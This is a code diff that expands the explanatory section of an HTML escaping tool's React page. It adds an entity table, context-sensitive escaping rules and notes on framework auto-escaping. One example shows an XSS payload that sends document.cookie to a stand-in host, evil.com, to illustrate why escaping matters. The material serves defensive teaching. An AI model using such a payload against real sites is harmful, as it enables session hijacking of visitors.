@@ -114,12 +114,109 @@ const toolConfig = createToolConfig({
 
     aboutTool: (
       <div className="space-y-6 text-muted-foreground">
-        <p>
-          HTML escaping (also called HTML encoding or entity encoding) is a critical web security practice that converts characters with special meaning in HTML markup into their entity representations. The five core characters that must be escaped are: less-than (&lt; to &amp;lt;), greater-than (&gt; to &amp;gt;), ampersand (&amp; to &amp;amp;), double quote (&quot; to &amp;quot;), and single quote/apostrophe (&apos; to &amp;#39;). Without proper escaping, user-submitted content containing these characters can be interpreted as HTML tags or JavaScript, creating cross-site scripting (XSS) vulnerabilities — one of the OWASP Top 10 security risks.
-        </p>
-        <p>
-          HTML unescaping (decoding) reverses the process, converting entity-encoded strings back to their original characters. This is essential when processing content from APIs that return HTML-encoded data, migrating content between CMS platforms, parsing RSS/Atom feeds, or debugging rendering issues where entities appear as literal text (e.g., users see &amp;amp; instead of &amp;). Modern frameworks like React, Angular, and Vue auto-escape by default, but understanding manual escaping remains crucial for raw HTML output, dangerouslySetInnerHTML contexts, server-side rendering, and email template development.
-        </p>
+        <div>
+          <h3 className="text-lg font-semibold text-foreground mb-2">HTML Escaping: The XSS Prevention Foundation</h3>
+          <p>
+            HTML escaping (also called HTML encoding or entity encoding) converts characters with special meaning in HTML markup into their entity representations. The five core characters that must be escaped:
+          </p>
+          <table className="w-full border-collapse text-sm mt-3">
+            <thead>
+              <tr className="border-b border-border">
+                <th className="text-left py-2 px-2 text-foreground">Character</th>
+                <th className="text-left py-2 px-2 text-foreground">Named entity</th>
+                <th className="text-left py-2 px-2 text-foreground">Numeric (dec)</th>
+                <th className="text-left py-2 px-2 text-foreground">Numeric (hex)</th>
+                <th className="text-left py-2 px-2 text-foreground">Why escape</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr className="border-b border-border"><td className="py-2 px-2"><code>&lt;</code></td><td className="py-2 px-2"><code>&amp;lt;</code></td><td className="py-2 px-2"><code>&amp;#60;</code></td><td className="py-2 px-2"><code>&amp;#x3C;</code></td><td className="py-2 px-2">Opens HTML tags</td></tr>
+              <tr className="border-b border-border"><td className="py-2 px-2"><code>&gt;</code></td><td className="py-2 px-2"><code>&amp;gt;</code></td><td className="py-2 px-2"><code>&amp;#62;</code></td><td className="py-2 px-2"><code>&amp;#x3E;</code></td><td className="py-2 px-2">Closes HTML tags</td></tr>
+              <tr className="border-b border-border"><td className="py-2 px-2"><code>&amp;</code></td><td className="py-2 px-2"><code>&amp;amp;</code></td><td className="py-2 px-2"><code>&amp;#38;</code></td><td className="py-2 px-2"><code>&amp;#x26;</code></td><td className="py-2 px-2">Starts other entities</td></tr>
+              <tr className="border-b border-border"><td className="py-2 px-2"><code>&quot;</code></td><td className="py-2 px-2"><code>&amp;quot;</code></td><td className="py-2 px-2"><code>&amp;#34;</code></td><td className="py-2 px-2"><code>&amp;#x22;</code></td><td className="py-2 px-2">Breaks attribute values</td></tr>
+              <tr><td className="py-2 px-2"><code>&apos;</code></td><td className="py-2 px-2"><code>&amp;#39;</code> (&apos;&amp;apos;&apos; HTML5)</td><td className="py-2 px-2"><code>&amp;#39;</code></td><td className="py-2 px-2"><code>&amp;#x27;</code></td><td className="py-2 px-2">Breaks single-quoted attrs</td></tr>
+            </tbody>
+          </table>
+          <p className="mt-3">
+            Without proper escaping, user content containing these characters can be interpreted as HTML tags or JavaScript, creating <strong>Cross-Site Scripting (XSS) vulnerabilities</strong> — #2 on the OWASP Top 10.
+          </p>
+        </div>
+
+        <div>
+          <h3 className="text-lg font-semibold text-foreground mb-2">XSS Attack Example</h3>
+          <p>Imagine a comments form that doesn&apos;t escape input. An attacker submits:</p>
+          <pre className="bg-muted p-3 rounded mt-2 text-xs overflow-x-auto">
+            <code>{`<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>`}</code>
+          </pre>
+          <p className="mt-3">When the comment renders unescaped, every visitor&apos;s browser runs the script, sending their session cookies to the attacker. With proper escaping, the same input renders harmlessly as visible text:</p>
+          <pre className="bg-muted p-3 rounded mt-2 text-xs overflow-x-auto">
+            <code>{`&lt;script&gt;fetch('https://evil.com/steal?cookie=' + document.cookie)&lt;/script&gt;`}</code>
+          </pre>
+          <p className="mt-3">
+            This single defense — escape all user content before rendering — prevents ~95% of XSS attacks.
+          </p>
+        </div>
+
+        <div>
+          <h3 className="text-lg font-semibold text-foreground mb-2">Context-Sensitive Escaping</h3>
+          <p>Different contexts require different escape strategies — naive &quot;just escape 5 chars&quot; doesn&apos;t always work:</p>
+          <ul className="list-disc pl-6 mt-2 space-y-1">
+            <li><strong>HTML text content:</strong> escape <code>&lt; &gt; &amp;</code> (basic XSS protection)</li>
+            <li><strong>HTML attribute values:</strong> escape <code>&lt; &gt; &amp; &quot; &apos;</code> AND always quote the attribute</li>
+            <li><strong>JavaScript context (inline script):</strong> use <code>JSON.stringify()</code>, not HTML escape — different encoding needed</li>
+            <li><strong>CSS context (inline style):</strong> CSS escaping rules differ — avoid user input here entirely</li>
+            <li><strong>URL context (href, src):</strong> use URL encoding, not HTML escape</li>
+            <li><strong>Email subject:</strong> use RFC 2047 encoding for non-ASCII chars</li>
+          </ul>
+        </div>
+
+        <div>
+          <h3 className="text-lg font-semibold text-foreground mb-2">Modern Framework Auto-Escaping</h3>
+          <p>Most modern frameworks auto-escape by default:</p>
+          <ul className="list-disc pl-6 mt-2 space-y-1">
+            <li><strong>React:</strong> JSX auto-escapes <code>&#123;variable&#125;</code>. <code>dangerouslySetInnerHTML</code> bypasses — only use with sanitized content.</li>
+            <li><strong>Vue:</strong> <code>&#123;&#123;variable&#125;&#125;</code> auto-escapes. <code>v-html</code> bypasses.</li>
+            <li><strong>Angular:</strong> <code>&#123;&#123;variable&#125;&#125;</code> auto-escapes. <code>[innerHTML]</code> sanitizes by default.</li>
+            <li><strong>Django:</strong> <code>&#123;&#123;variable&#125;&#125;</code> auto-escapes in templates. <code>&#123;% autoescape off %&#125;</code> bypasses.</li>
+            <li><strong>Rails:</strong> <code>&lt;%= variable %&gt;</code> auto-escapes. <code>raw()</code> or <code>.html_safe</code> bypasses.</li>
+            <li><strong>Laravel Blade:</strong> <code>&#123;&#123; $variable &#125;&#125;</code> auto-escapes. <code>{`{!! $variable !!}`}</code> bypasses.</li>
+          </ul>
+          <p className="mt-3">
+            <strong>Don&apos;t bypass auto-escaping</strong> unless you&apos;ve sanitized with a battle-tested library (DOMPurify on the client, Bleach in Python, sanitize-html in Node).
+          </p>
+        </div>
+
+        <div>
+          <h3 className="text-lg font-semibold text-foreground mb-2">Common HTML Entities Reference</h3>
+          <ul className="list-disc pl-6 space-y-1">
+            <li><code>&amp;nbsp;</code> — non-breaking space (forces no line break)</li>
+            <li><code>&amp;copy;</code> — © copyright</li>
+            <li><code>&amp;trade;</code> — ™ trademark</li>
+            <li><code>&amp;reg;</code> — ® registered</li>
+            <li><code>&amp;hellip;</code> — … horizontal ellipsis</li>
+            <li><code>&amp;mdash;</code> — — em dash</li>
+            <li><code>&amp;ndash;</code> — – en dash</li>
+            <li><code>&amp;ldquo; &amp;rdquo;</code> — &ldquo;curly quotes&rdquo;</li>
+            <li><code>&amp;laquo; &amp;raquo;</code> — « » guillemets</li>
+            <li><code>&amp;euro;</code> — € euro</li>
+            <li><code>&amp;pound;</code> — £ pound sterling</li>
+            <li><code>&amp;times;</code> — × multiplication sign</li>
+            <li><code>&amp;divide;</code> — ÷ division sign</li>
+            <li><code>&amp;deg;</code> — ° degree</li>
+            <li><code>&amp;micro;</code> — µ micro</li>
+          </ul>
+        </div>
+
+        <div>
+          <h3 className="text-lg font-semibold text-foreground mb-2">Common Bugs This Tool Catches</h3>
+          <ul className="list-disc pl-6 space-y-1">
+            <li><strong>Double encoding:</strong> <code>&amp;amp;lt;</code> visible in output — content was escaped twice</li>
+            <li><strong>Mojibake / wrong encoding:</strong> entities show as literal &quot;&amp;amp;&quot; in browser — your HTML&apos;s charset declaration is wrong</li>
+            <li><strong>Missing semicolons:</strong> <code>&amp;ampltdiv&gt;</code> won&apos;t render as a tag — strict parsers require semicolons</li>
+            <li><strong>Invalid entity names:</strong> <code>&amp;copyright;</code> doesn&apos;t exist; use <code>&amp;copy;</code></li>
+            <li><strong>Curly quote contamination:</strong> Microsoft Word smart quotes (&ldquo;&rdquo;) need to become &quot;&amp;ldquo;&quot;/&quot;&amp;rdquo;&quot; or straight quotes</li>
+          </ul>
+        </div>
       </div>
     ),
 
